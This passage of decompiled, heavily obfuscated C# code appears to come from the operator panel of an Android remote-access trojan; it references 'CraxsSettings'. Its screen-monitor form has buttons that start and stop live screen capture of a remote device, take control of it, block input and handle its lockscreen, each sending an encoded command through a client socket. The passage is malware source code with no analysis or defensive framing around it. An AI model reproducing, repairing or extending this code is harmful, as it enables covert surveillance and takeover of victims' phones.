                  (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0032B4D0529 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
                  (object) Codes.Encoding().GetBytes(EXGuarder.\u0031C4A3B16),
                  (object) ((WebViewMonitor) this).classClient
                };
                num1 = (int) num3 * -771901120 ^ 553295790;
                continue;
              case 3:
                goto label_3;
              default:
                goto label_17;
            }
          }
label_16:
          return;
label_17:;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        if (((WebViewMonitor) this).classClient == null)
          return;
        try
        {
          string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          ((WebViewMonitor) this).classClient.SendMessage(new object[4]
          {
            (object) ((WebViewMonitor) this).Client,
            (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031253071D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
            (object) Codes.Encoding().GetBytes(EXGuarder.\u0031C4A3B16),
            (object) ((WebViewMonitor) this).classClient
          });
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
label_12:
          int num4 = 1024807199;
          while (true)
          {
            int num5 = num4;
            uint num6;
            switch ((num6 = (uint) -((-((1116049077 + 991916047) * -1174275255) - ~(num5 ^ ((-366723624 ^ -1397992650) + 692488431 * 230160278 + ~--527125713) * 1538018137 + (~-35413833 ^ -(-1863965201 * 1004499529 + --474135281)))) * -1177999391 * 997328675)) % 3U)
            {
              case 0:
                goto label_12;
              case 1:
                goto label_18;
              case 2:
                ProjectData.ClearProjectError();
                num4 = (int) num6 * -443869855 ^ 1059712474;
                continue;
              default:
                goto label_19;
            }
          }
label_18:
          return;
label_19:;
        }
      }
    }

    private void Dismisbtn_Click(object sender, EventArgs e)
    {
      if (this.Livepicbox.Image == null)
        return;
label_1:
      int num1 = -1425212925;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-~num1 * 1529768097)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            this.Livepicbox.Image = (Image) null;
            ((WebViewMonitor) this).ScreenShotFoucs = false;
            this.Dismisbtn.Visible = false;
            num1 = (int) num2 * 1003376286 ^ 917671342;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void Checkblock_MouseClick(object sender, MouseEventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      TcpClient client = ((Data._Closure\u0024__) ((WebViewMonitor) this).classClient).myClient;
label_1:
      int num1 = 99155517;
      while (true)
      {
        int num2 = num1;
        uint num3;
        object[] ParametersObjects1;
        string[] strArray;
        object[] ParametersObjects2;
        Dialog1 dialog1;
        object[] ParametersObjects3;
        switch ((num3 = (uint) (1390766895 - ((num2 + (1816363550 + ~--1704117424 - (1034147581 * (1572698261 - 510428731) + (-256564553 * -106219727 + 1511782863 * 1288163316)) ^ (1347022489 - 42649503) * -296860827)) * 159815343 ^ ~(-526698571 - -1128258732) - -~1703896512 ^ -(-757510239 * -904554613) ^ 136071331))) % 17U)
        {
          case 0:
            num1 = (int) num3 * -94634625 ^ 1812960301;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects3 = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00305354C1C + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0037009631A),
              (object) ((WebViewMonitor) this).classClient
            };
            num1 = (int) num3 * 1732966053 ^ -1223690930;
            continue;
          case 2:
            int num4;
            num1 = num4 = ((WebViewMonitor) this).classClient == null ? -1231700447 : (num4 = -1049041737);
            continue;
          case 3:
            this.chkctrl.Enabled = false;
            num1 = (int) num3 * -1578394535 ^ 149564765;
            continue;
          case 4:
            strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
            num1 = (int) num3 * 485722428 ^ 1093398890;
            continue;
          case 5:
            int num5 = ((WebViewMonitor) this).classClient == null ? 1031532006 : (num5 = -2064971294);
            num1 = num5 ^ (int) num3 * 1370285779;
            continue;
          case 6:
            goto label_3;
          case 7:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects1 = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003142D6528 + ((Drooper) dialog1).TheText + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0037009631A),
              (object) ((WebViewMonitor) this).classClient
            };
            num1 = (int) num3 * -1472673460 ^ 1995407840;
            continue;
          case 8:
            ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects3);
            num1 = (int) num3 * -180981012 ^ -1155337218;
            continue;
          case 9:
            int num6 = !this.checkblock.Checked ? -769046719 : (num6 = -1823368091);
            num1 = num6 ^ (int) num3 * 1185827642;
            continue;
          case 10:
            ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects1);
            num1 = (int) num3 * -585430187 ^ 552958209;
            continue;
          case 11:
            ((Drooper) dialog1).Title = EXGuarder.\u003214A4054;
            int num7 = (int) dialog1.ShowDialog();
            int num8 = dialog1.DialogResult != DialogResult.OK ? 429692004 : (num8 = -1467314432);
            num1 = num8 ^ (int) num3 * -518414519;
            continue;
          case 12:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects2 = new object[4]
            {
              (object) client,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003761E7053 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0037009631A),
              (object) ((WebViewMonitor) this).classClient
            };
            num1 = (int) num3 * -2138444921 ^ -1488503483;
            continue;
          case 13:
            ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects2);
            num1 = (int) num3 * -447151540 ^ -1570511571;
            continue;
          case 14:
            this.chkctrl.Enabled = true;
            num1 = -1017767628;
            continue;
          case 15:
            goto label_1;
          case 16:
            dialog1 = (Dialog1) new CraxsSettings();
            num1 = (int) num3 * -1540795959 ^ 1535472146;
            continue;
          default:
            goto label_19;
        }
      }
label_3:
      return;
label_19:;
    }

    private void ScreenShoter_KeyDown(object sender, KeyEventArgs e)
    {
    }

    private void ScreenShoter_KeyUp(object sender, KeyEventArgs e)
    {
    }

    private void Save_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.Save.Checked)
        goto label_5;
label_1:
      int num1 = -473461533;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~~num1 - -((1646505577 ^ -2091390176) + (868846440 - 1106119670)) ^ ~-730261074 - (1957323162 - 547881172))) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            this.Timer1.Start();
            num1 = (int) num2 * 808275711 ^ -1798306173;
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.Timer1.Stop();
      num1 = -513826712;
      goto label_2;
    }

    private void DrakeUIAvatar3_Click(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      if (((WebViewMonitor) this).LIVE)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
label_3:
        int num1 = -940383200;
        object[] ParametersObjects;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 - ~(-(2131963721 - 613371052) + (--1115558626 - (-1232469811 ^ 969683459)) - (~~1298592637 + ((-1893496370 ^ 414038321) + 318352470)))) * 145971593)) % 9U)
          {
            case 0:
              ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects);
              num1 = (int) num2 * 720537718 ^ 1918399615;
              continue;
            case 1:
              goto label_15;
            case 2:
              this.toptitle.Text = EXGuarder.\u00304715B62;
              this.StartButton.Enabled = false;
              this.StopButton.Enabled = true;
              num1 = (int) num2 * -760469451 ^ 1588616219;
              continue;
            case 3:
              this.refreshtimer.Start();
              num1 = (int) num2 * -1921296962 ^ -85167204;
              continue;
            case 4:
              this.vewpnl.Enabled = true;
              num1 = (int) num2 * -2122611037 ^ -1949790503;
              continue;
            case 5:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated method
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((WebViewMonitor) this).Client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003612C3009 + this.Qualtibox.Text + EXGuarder.\u0030C193148 + this.FPSBOX.Text + EXGuarder.\u0030C193148 + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress + EXGuarder.\u0030C193148 + MySettings.get_Settings().resolution + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0036B1C640C + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0035F3C335D),
                (object) ((WebViewMonitor) this).classClient
              };
              num1 = (int) num2 * 494106301 ^ 1696554833;
              continue;
            case 6:
              goto label_3;
            case 7:
              this.refreshtimer.Enabled = true;
              num1 = (int) num2 * -1802994755 ^ -1290777363;
              continue;
            case 8:
              this.Livepicbox.Enabled = true;
              ((WebViewMonitor) this).LIVE = true;
              num1 = (int) num2 * 913496506 ^ 404621131;
              continue;
            default:
              goto label_16;
          }
        }
label_15:
        return;
label_16:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DrakeUIAvatar6_Click(object sender, EventArgs e) => this.Close();

    private void Chkctrl_MouseClick(object sender, MouseEventArgs e)
    {
      if (!this.chkctrl.Checked)
        goto label_10;
label_1:
      int num1 = 774909446;
label_2:
      object[] ParametersObjects1;
      object[] ParametersObjects2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((~(num1 * -641545161) * 1479459353 ^ (1447639115 + 598715415) * -230192935) + (246695516 + 265560955)) * 1032836493)) % 11U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_10;
          case 2:
            goto label_3;
          case 3:
            int num3 = !this.checkblock.Checked ? 542905275 : (num3 = 931742046);
            num1 = num3 ^ (int) num2 * 1708551697;
            continue;
          case 4:
            ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects1);
            num1 = (int) num2 * 1313368241 ^ 1625327279;
            continue;
          case 5:
            ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects2);
            num1 = (int) num2 * 310802431 ^ 310440326;
            continue;
          case 6:
            int num4 = !((WebViewMonitor) this).LIVE ? -1008715165 : (num4 = 760969088);
            num1 = num4 ^ (int) num2 * -1440728421;
            continue;
          case 7:
            int num5 = ((WebViewMonitor) this).classClient == null ? -768867913 : (num5 = -884003461);
            num1 = num5 ^ (int) num2 * 1050027690;
            continue;
          case 8:
            string[] strArray1 = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects1 = new object[4]
            {
              (object) ((Data._Closure\u0024__) ((WebViewMonitor) this).classClient).myClient,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003283B501D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00350724206),
              (object) ((WebViewMonitor) this).classClient
            };
            num1 = (int) num2 * 46030552 ^ 1562257798;
            continue;
          case 9:
            ((WebViewMonitor) this).iscontroled = (object) true;
            int num6 = ((WebViewMonitor) this).classClient == null ? -1777318471 : (num6 = 521609063);
            num1 = num6 ^ (int) num2 * -60844270;
            continue;
          case 10:
            string[] strArray2 = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects2 = new object[4]
            {
              (object) ((Data._Closure\u0024__) ((WebViewMonitor) this).classClient).myClient,
              (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035E512763 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray2[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u00350724206),
              (object) ((WebViewMonitor) this).classClient
            };
            num1 = (int) num2 * -952141362 ^ -1524476117;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:
      return;
label_10:
      num1 = !Conversions.ToBoolean(((WebViewMonitor) this).iscontroled) ? -967105591 : (num1 = -1714048413);
      goto label_2;
    }

    private void DrakeUIAvatar5_Click(object sender, EventArgs e)
    {
      this.WindowState = FormWindowState.Minimized;
    }

    private void DrakeUIAvatar3_Click_1(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
label_2:
        int num1 = -1450350368;
        while (true)
        {
          int num2 = num1;
          uint num3;
          object[] ParametersObjects;
          switch ((num3 = (uint) (1292982591 * --1792849260 - ~(num2 + (~(2012497964 * 578190323 ^ -1132456845 - -362392251 ^ -(2125492827 * -1579971839)) + -176299291 * (1670867587 * (~787800393 + (554248730 - 1371734156))))))) % 4U)
          {
            case 0:
              goto label_2;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((WebViewMonitor) this).Client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0034F685513 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u003585B5564),
                (object) ((WebViewMonitor) this).classClient
              };
              num1 = (int) num3 * 781157264 ^ 1881097621;
              continue;
            case 2:
              ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects);
              num1 = (int) num3 * -1416401633 ^ -1726015256;
              continue;
            case 3:
              goto label_8;
            default:
              goto label_9;
          }
        }
label_8:
        return;
label_9:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DrakeUIAvatar4_Click(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
label_2:
        int num1 = -1547748869;
        object[] ParametersObjects;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-~~(num1 * -297872619) - (540527825 - 600399043))) % 4U)
          {
            case 0:
              ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects);
              num1 = (int) num2 * 973295720 ^ -1286964447;
              continue;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((WebViewMonitor) this).Client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00351292D30 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0036216412C),
                (object) ((WebViewMonitor) this).classClient
              };
              num1 = (int) num2 * 651135482 ^ -2107942220;
              continue;
            case 2:
              goto label_2;
            case 3:
              goto label_11;
            default:
              goto label_7;
          }
        }
label_11:
        return;
label_7:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_9:
        int num3 = -1719267131;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) -(-~~(num3 * -297872619) - (540527825 - 600399043))) % 3U)
          {
            case 0:
              goto label_4;
            case 1:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * -2032652603 ^ -633181578;
              continue;
            case 2:
              goto label_9;
            default:
              goto label_14;
          }
        }
label_4:
        return;
label_14:;
      }
    }

    private void DrakeUIAvatar7_Click(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
label_2:
        int num1 = -789057228;
        while (true)
        {
          int num2 = num1;
          uint num3;
          object[] ParametersObjects;
          switch ((num3 = (uint) ((1180296884 ^ 857929109) - -~((num2 - -1757913607 * ~(-(1994610285 - 1557642608) - ~(-1882712103 ^ -917483120))) * -1475467843) - -452591100)) % 4U)
          {
            case 0:
              goto label_8;
            case 1:
              ((WebViewMonitor) this).classClient.SendMessage(ParametersObjects);
              num1 = (int) num3 * -1483302160 ^ -533331326;
              continue;
            case 2:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((WebViewMonitor) this).Client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00311790563 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0036B1A400C),
                (object) ((WebViewMonitor) this).classClient
              };
              num1 = (int) num3 * 574410144 ^ -1622594699;
              continue;
            case 3:
              goto label_2;
            default:
              goto label_9;
          }
        }
label_8:
        return;
label_9:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void StopButton_Click(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
label_2:
        int num1 = -317558238;
        object[] ParametersObjects;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-num1 - -(~~-318830237 - (-727463833 * 213867523 + (-1863961135 ^ -1440789310)))) * 1388196823 ^ 1338083070 - -1947122919 + (155678783 - 1816013584) ^ -426454052)) % 11U)
          {
            case 1:
              // ISSUE: reference to a compiler-generated field
              ((WebViewMonitor) this).ScreenClass.Close(((Data._Closure\u0024__) ((WebViewMonitor) this).ScreenClass).myClient);
              num1 = (int) num2 * -1578032648 ^ -1231785508;
              continue;
            case 2:
              int num3 = ((WebViewMonitor) this).ScreenClass == null ? -1575214163 : (num3 = -2035535750);
              num1 = num3 ^ (int) num2 * -153189833;
              continue;
            case 3:
              ((WebViewMonitor) this).LIVE = false;
              this.refreshtimer.Stop();
              num1 = (int) num2 * -401284613 ^ -1922594454;
              continue;
            case 4:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects = new object[4]
              {
                (object) ((WebViewMonitor) this).Client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003241B681D + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0031C6D3843 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u00379734805),
                (object) ((WebViewMonitor) this).classClient
              };
